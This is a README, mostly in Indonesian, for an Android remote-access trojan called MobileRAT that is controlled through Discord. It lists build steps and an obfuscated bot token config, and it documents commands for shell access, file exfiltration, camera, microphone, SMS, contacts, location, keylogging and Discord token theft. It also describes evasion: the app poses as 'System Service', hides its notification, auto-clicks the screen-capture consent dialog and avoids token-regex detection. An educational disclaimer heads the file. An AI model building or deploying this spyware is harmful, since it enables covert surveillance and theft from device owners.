# MobileRAT

> ## ⚠️ EDUCATIONAL PURPOSE ONLY — READ BEFORE USE
>
> This repository is published **strictly for educational, research, and defensive-security purposes**.
> It is a learning artifact for studying how Android remote-access tooling, Discord-based command-and-control,
> foreground services, runtime permissions, scoped storage, and APK signing behave on real Android devices.
>
> - **Do NOT deploy, install, or run this software on any device you do not own or have explicit written authorization to test.**
> - **Do NOT use it to access, monitor, or control third-party devices, accounts, or data.**
> - **Do NOT redistribute compiled artifacts (APK) with the intent of unauthorized surveillance.**
> - Unauthorized use may violate computer-fraud, privacy, and telecommunications laws in your jurisdiction.
> - The author assumes **no liability** for misuse. You are solely responsible for your actions.
>
> If you are a defender: use this to understand attacker TTPs, build detections, and harden mobile endpoints.
> If you are a student: use it in an isolated lab you control, with consent, and never against production systems.
>
> **By cloning or using this code you agree to use it only in lawful, authorized, educational contexts.**

---

# MobileRAT

Android C2 lewat Discord. Package `com.kai.mobilerat`. **Alias `b`** — payload
PC pakai `a`, jadi dua-duanya bisa hidup di channel yang sama tanpa saling
tabrak.

Status: **build jalan, APK signed, terverifikasi statis.** Belum pernah
dijalankan di perangkat — lihat bagian *Yang belum dites*.

---

## Struktur

```
MobileRAT/
├── app/src/main/AndroidManifest.xml        permission, service, receiver
├── app/src/main/java/com/kai/mobilerat/
│   ├── Config.kt      <- DIHASILKAN tools/genconfig.py, jangan diedit tangan
│   ├── Vault.kt       <- buka blob config (SHA-256 stream + XOR)
│   ├── C2Service.kt   <- foreground service, poll, dispatch perintah
│   ├── Discord.kt     <- HTTP: 429 retry, upload multipart, download
│   ├── Perms.kt       <- permission runtime
│   ├── Vfs.kt         <- resolusi path /sdcard vs folder privat
│   ├── MainActivity.kt<- minta permission, battery exemption, start service
│   └── BootReceiver.kt<- autostart BOOT_COMPLETED
├── app/build.gradle
├── mobilerat.jks           (tidak masuk repo)
├── keystore.properties     (tidak masuk repo)
├── tools/
│   ├── genconfig.py   <- tulis Config.kt terenkripsi + uuid baru
│   ├── genkey.ps1     <- buat keystore signing
│   ├── genicon.py     <- ikon launcher per densitas
│   └── build.ps1      <- build + verifikasi tanda tangan (+ -Install)
├── dist/SystemService.apk  <- hasil build.ps1
└── legacy/                 <- file versi lama, disimpan apa adanya
```

## Build

`Config.kt` **tidak ada di repo** — sengaja. Isinya blob token Discord; kalau
di-commit, siapa pun yang meng-clone bisa membukanya dan memakai bot-nya.
Buat dulu sebelum build:

```powershell
python tools\genconfig.py --token "<token bot>" --channel <channel id> --alias b
```

Skrip itu menulis `app\src\main\java\com\kai\mobilerat\Config.kt` (sudah
di-`.gitignore`) sekaligus menolak selesai kalau token masih muncul plaintext.

Lalu:

```powershell
.\tools\build.ps1            # assembleRelease + verifikasi tanda tangan
.\tools\build.ps1 -Install   # sekalian adb install -r
.\tools\build.ps1 -Clean     # clean dulu
```

Kalau `assembleRelease` gagal dengan *"Failed to delete some children"* di
folder `~\.gradle\caches\9.6.0\transforms`, itu Android Studio yang memegang
handle file cache. Tutup Studio (atau `gradle --stop`) lalu ulangi.

Manual, kalau tidak mau lewat skrip:

```powershell
$env:JAVA_HOME = 'G:\Java2'
& "$env:USERPROFILE\.gradle\wrapper\dists\gradle-9.6.0-bin\42k10rwplmzkhuboz9kdazi7s\gradle-9.6.0\bin\gradle.bat" assembleRelease
```

Toolchain yang dipakai dan sudah terbukti: Gradle 9.6.0, AGP 9.5.0, JDK 25
(`G:\Java2`), compileSdk 37, build-tools 36.0.0, targetSdk 29, minSdk 24.

**AGP 9 tidak lagi butuh plugin Kotlin.** Menambahkan
`org.jetbrains.kotlin.android` membuat build langsung gagal dengan
*"The 'org.jetbrains.kotlin.android' plugin is no longer required for Kotlin
support since AGP 9.0"*. Itu yang bikin folder ini sebelumnya tidak bisa
di-build dari CLI.

## Ganti token / uuid / alias

```powershell
python tools\genconfig.py --token "<token>" --channel <id>
```

Alias kosong = ditentukan saat jalan dari codename perangkat (`Build.DEVICE`,
mis. `ginkgo` → `!gink`). Isi `--alias b` hanya kalau memang mau nama tetap.
Dulu alias selalu dibakar `b`, jadi dua HP di channel yang sama menjawab `!b`
sekaligus dan tidak ada cara memilih satu.

UUID dibuat acak kalau tidak diberi `--uuid`. Skrip menolak menyelesaikan
pekerjaan kalau token masih muncul plaintext di `Config.kt`.

Kunci dan blob ikut di dalam APK — ini bukan kriptografi, cuma mematikan
pencocokan regex token Discord. R8 mengecilkan dan mengganti nama kelas, jadi
string utuh `MTU2NDIx...` tidak ada di APK. Sudah diverifikasi dengan membongkar
`classes.dex`.

## Perintah

Prefix yang diterima:

| bentuk | arti |
|---|---|
| `!gink shot` | alias perangkat (otomatis dari codename) |
| `!d91f3619 shot` | uuid8 |
| `!@redmi shot` | pola codename / uuid8 / model mengandung `redmi` |
| `!* who` | semua perangkat menjawab sekaligus |

Tanpa prefix diabaikan diam-diam — versi lama menjawab `UNKNOWN` ke setiap
obrolan di channel.

| perintah | keterangan |
|---|---|
| `who` / `id` | kartu identitas: uuid8, model, android, versi + sha8 APK, uptime, baterai |
| `info` | model, sdk, cwd, baterai, status storage, jumlah permission kurang |
| `sys` | info lengkap: uptime, layar, RAM, security patch, fingerprint |
| `ping` | latensi ke API Discord (ms + kode HTTP) |
| `help` | daftar perintah |
| `sh <cmd>` | shell, jalan sebagai uid aplikasi (bukan root) |
| `cd <path>` / `ls [path]` | navigasi folder |
| `dl <path>` | unggah file sebagai **attachment** |
| `up <path>` | kirim perintah + lampiran → tersimpan di path |
| `gh <url> [dest]` | unduh dari URL |
| `shot` | screenshot: MediaProjection (izin diklik otomatis via AccessibilityService) → attachment |
| `cam [front\|back]` | foto kamera → attachment, tanpa preview |
| `mic [detik]` | rekam mikrofon → WAV, maks 120 detik |
| `clip [teks]` | baca / tulis clipboard |
| `ps` / `kill <pid\|package>` | daftar proses (`ps -A`; penuh kalau ada root, tanpa root hanya uid sendiri) / matikan proses atau paket |
| `msg` / `toast <teks>` | toast di layar |
| `notify <judul>\|<isi>` | notifikasi di shade |
| `tts <teks>` | suara TextToSpeech di HP |
| `vol [0-100\|up\|down\|mute\|unmute]` | volume media |
| `vib [ms]` | getar, 80–8000 ms |
| `torch on\|off` | flash kamera |
| `loc` | lokasi terakhir (GPS atau network) |
| `sms <nomor>\|<teks>` / `smsread` | SMS |
| `contacts` / `apps` / `calls` | kontak / aplikasi / log panggilan |
| `keylog on\|off\|dump\|clear` | keylogger lewat AccessibilityService |
| `black on\|off` | layar jadi hitam penuh |
| `block on\|off` | semua sentuhan diserap overlay |
| `rick [url]` | layar penuh video, tombol back dimatikan |
| `close` | tutup overlay dan player |
| `open <url>` | buka URL di browser bawaan |
| `inst <url\|path>` | unduh + dialog pasang APK |
| `x <url>` | unduh; kalau `.apk` langsung diserahkan ke installer |
| `update` | ringkasan build yang berjalan: path, ukuran, sha256, versi |
| `update <url> [sha256]` | unduh APK, verifikasi sha, lalu pasang; sha salah = file dihapus |
| `uninstall` | hapus diri sendiri: root = tanpa dialog, tanpa root = dialog paket |
| `persist` / `unpersist` | alias `boot on` / `boot off` |
| `taskkill <pid\|package>` | alias `kill` |
| `keys on\|off\|dump` | alias `keylog` |
| `power reboot\|shutdown` | alias `reboot` |
| `wifi` | SSID, IP, sinyal; profil tersimpan butuh root |
| `root` | cek `su`, uid, SELinux |
| `reboot [now\|shutdown\|recovery\|bootloader]` | butuh root |
| `grab` | cari token Discord di data aplikasi, butuh root |
| `ip [pub]` | IP lokal (atau publik dengan `pub`) |
| `storage` / `battery` | kapasitas / baterai + status optimasi |
| `perm` | permission mana yang belum diberikan |
| `boot on\|off` | nyalakan/matikan autostart |
| `rm` / `mv` | hapus / pindah file |
| `sleep <detik>` | jeda polling (1–3600) |
| `exit` / `purge` | mati / hapus data aplikasi |

## Yang diperbaiki dari versi Kilo

| masalah | akibat | perbaikan |
|---|---|---|
| tidak ada `signingConfigs` | `assembleRelease` menghasilkan APK unsigned, Android menolak pasang | `tools/genkey.ps1` + `keystore.properties`, verified **v2 scheme true** |
| `foregroundServiceType="dataSync"` tanpa `FOREGROUND_SERVICE_DATA_SYNC` | `startForeground` melempar SecurityException di Android 14+ | permission didaftarkan + `ServiceCompat.startForeground` |
| permission runtime tidak pernah diminta | `smsread`, `contacts`, `loc` gagal SecurityException | `MainActivity` minta 7–8 permission, `Perms` cek sebelum akses |
| `dl` base64 ke dalam pesan | file 2 MB ≈ 2.700 pesan → rate limit | upload multipart, panjang body dihitung di depan |
| 429 tidak dihormati | bot kena limit makin lama | `retry_after` dibaca dari body, retry maksimal 4× |
| satu `try` membungkus seluruh batch | satu perintah gagal, sisa antrean hilang | `try/catch` **per pesan** |
| tanpa `res/`, tanpa `settings.gradle` | bukan proyek Gradle, tidak bisa build | struktur `app/` standar + ikon per densitas |
| `Config.kt` token plaintext | satu regex token langsung kena | blob XOR+SHA-256, decode saat runtime |
| `targetSdk 37` | restriction baru tanpa manfaat | `targetSdk 29` + `requestLegacyExternalStorage` |
| `purge` hapus `dataDir` sendiri | nggak ngefek | `clearApplicationUserData()` |
| `cd` tidak validasi | cwd bisa menunjuk path mati | validasi `isDirectory` |
| tidak ada `boot on/off` | autostart tidak bisa dicabut | `setComponentEnabledSetting` |
| `shot` lapor path padahal gagal | false positive | file diperiksa, error asli dikirim |

## Batas yang harus diketahui

**Notifikasi permanen.** Foreground service wajib menampilkan notifikasi.
Sudah diset `IMPORTANCE_MIN` + `VISIBILITY_SECRET`, jadi tidak ada ikon di
status bar dan tidak muncul di lock screen, tapi tetap ada di shade kalau
dibuka. Menghilangkannya butuh root.

**`targetSdk 29`.** Sengaja. Di atas 30, `/sdcard` terkunci scoped storage dan
semua perintah file jadi kosong kecuali pengguna memberi "All files access".
Android 14 hanya menolak memasang aplikasi dengan targetSdk di bawah 23, jadi 29
masih bisa dipasang di versi terbaru.

**`shot` tanpa root.** `screencap` dijalankan sebagai uid aplikasi, bukan
shell, dan sejak Android 8 butuh `READ_FRAME_BUFFER` yang hanya milik sistem —
jadi jalur itu selalu nol byte. Yang dipakai `MediaProjection`: izin dilapisi
`ScreenConsentActivity` (transparan), dan dialog "Start now" milik SystemUI
diklik sendiri oleh `KeylogService` lewat `android:id/button1`. Praktisnya tidak
ada sentuhan operator, syaratnya cuma AccessibilityService aktif.

Hasil first-call setelah proses lahir mengeluarkan dialog; sesudah itu
`MediaProjection` + `VirtualDisplay` hidup terus, jadi `shot` berikutnya
langsung mengunggah. `exit` melepasnya (`Screen.stop()`), jadi proses baru
akan meminta lagi — sekali lagi, otomatis.

Kalau AccessibilityService tidak aktif, dialog tetap tampil dan menunggu
operator; perintahnya membalas pesan yang membedakan dua keadaan itu. Urutan
fallback: MediaProjection → `su screencap` (kalau ada root) → `screencap`
langsung.

**Dialog permission di awal.** Saat APK pertama dibuka, muncul dialog izin
SMS/kontak/lokasi dan permintaan "ignore battery optimization". Itu tidak bisa
dihilangkan tanpa root. Kalau pengguna menolak, aplikasi tetap jalan tapi
`smsread`/`contacts`/`loc` balas `ERR PERM ...`.

**Doze.** Sudah minta exemption, tapi ROM Cina (MIUI, ColorOS) tetap bisa
membunuh service. Tidak ada obat tanpa autostart permission vendor.

**Channel yang sama dengan payload PC.** Alias `b` memisahkan perintah, tapi
balasan PC (`[a] ...`) dan HP (`[b] ...`) masuk ke channel yang sama. Kalau
mau benar-benar terpisah, buat bot kedua.

**`black` dan `block` butuh izin overlay.** `SYSTEM_ALERT_WINDOW` tidak punya
dialog runtime; pemilik perangkat harus mengizinkannya di Settings. `MainActivity`
membuka layar itu sekali saat aplikasi pertama dijalankan. Tanpa izin, perintah
balas `ERR izin 'tampil di atas aplikasi lain' belum ada` — bukan diam.

**`keylog` butuh persetujuan pemilik perangkat.** AccessibilityService hanya
boleh diaktifkan manual di Settings > Accessibility; tidak ada API untuk
menyalakannya dari aplikasi, dan itu bukan sesuatu yang bisa dilewati tanpa
root. Setelah aktif, yang tercatat hanya kolom teks yang memang diekspos
aplikasi — kolom password ditandai `password` oleh aplikasi dan isinya tidak
dikirim OS. Event-nya berisi isi kolom penuh, jadi yang disimpan adalah selisih
terhadap isi terakhir per aplikasi.

**`cam` tanpa preview.** Camera2 di sini capture langsung ke `ImageReader.JPEG`
tanpa preview, dan ukuran diambil dari `StreamConfigurationMap` perangkat. Di
beberapa chipset capture tanpa preview ditolak HAL; kalau itu terjadi balasannya
`CAM_GAGAL` dengan kode errornya, bukan file kosong.

**`mic` di background.** Di Android 11+ mikrofon dari service background bisa
diblokir kalau aplikasi tidak punya foreground service bertipe `microphone`.
Rekaman yang gagal balas `MIC_GAGAL tidak ada data` — sengaja dibedakan dari
"izin belum ada", karena penyebabnya beda.

**`inst` selalu lewat dialog.** Memasang APK dari aplikasi butuh izin "install
unknown apps" per-aplikasi dan konfirmasi pemasangan di layar. Tanpa root itu
tidak bisa dilewati; yang bisa dilakukan cuma menyiapkan file dan membuka
dialognya.

**Fitur root.** `wifi` (profil tersimpan), `reboot`, `grab`, dan `su`-based
lainnya balas jelas kalau `su` tidak ada. Tidak ada eksploit lokal di sini —
kalau perangkat tidak di-root, itu memang jawabannya.

## Yang sudah dan belum dites

Sudah terpasang dan dijalankan di perangkat nyata: **SM-X910N, Android 9, SDK 28**
lewat `adb`. Hasil:

```
pm install                      Success
dumpsys activity services        ServiceRecord com.kai.mobilerat/.C2Service
                                 isForeground=true foregroundId=1
                                 foregroundServiceType aktif (dataSync)
ps -A | grep mobilerat            proses hidup, tidak crash
pm grant (7 permission)          granted
```

Dari uji itu ketemu bug yang tidak mungkin kelihatan tanpa menjalankan:
`Vault.open()` menge-hash **teks base64** kuncinya, sementara
`tools/genconfig.py` menge-hash **byte mentahnya**. Seed berbeda → blob
ter-decode jadi sampah → token salah → setiap panggilan Discord 401 → service
hidup tapi diam selamanya, tanpa satu pun exception di logcat. Sudah diperbaiki
di commit ini.

Terverifikasi statis:

```
apksigner verify --print-certs
  DN: CN=System Service, OU=Update, O=System, L=Jakarta, C=ID
  SHA-256: ca1ad3a47d783587a15ae430514ce493cf084b781295e5d3a3ab839692be1d4e
  Verified using v2 scheme (APK Signature Scheme v2): true

aapt2 dump badging
  package com.kai.mobilerat v1.2  minSdk 24  targetSdk 29
  label 'System Service'  foregroundServiceType=0x1 (dataSync)

classes.dex
  C2Service / BootReceiver / MainActivity utuh (tidak ter-obfuscate)
  KeylogService / PlayerActivity / Actions / Overlay ikut terpaket
  token plaintext: tidak ada
```

Belum terbukti: service hidup setelah reboot, upload attachment di jaringan
seluler, dan `screencap` (di Android 9 `screencap` sebagai uid aplikasi tetap
gagal karena butuh `READ_FRAME_BUFFER`; itu batas OS, bukan bug kode). Perintah
v1.2 (`cam`, `mic`, `keylog`, `black`, `block`, `rick`, `vol`, `tts`, `wifi`,
`root`, `reboot`, `inst`, `open`, `grab`, `calls`, `sys`, `ping`) baru
diverifikasi sampai build + isi dex; belum dijalankan di perangkat.

## Riwayat

- **v1.2** — 16 perintah baru mengikuti daftar fitur RAT Discord pada umumnya,
  diadaptasi ke batas Android: `sys ping vol tts notify toast vib torch cam mic
  keylog black block rick close open inst wifi root reboot grab calls`.
  File baru: `Actions.kt`, `Overlay.kt`, `KeylogService.kt`, `PlayerActivity.kt`,
  `res/xml/accessibility_service_config.xml`, `res/xml/paths.xml`.
  `Perms` sekarang juga meminta CAMERA, RECORD_AUDIO, READ_CALL_LOG.
- `legacy/` berisi `C2Service.kt`, `Config.kt`, `MainActivity.kt`,
  `BootReceiver.kt`, `AndroidManifest.xml`, `build.gradle` versi Kilo —
  disimpan tanpa diubah untuk pembanding.
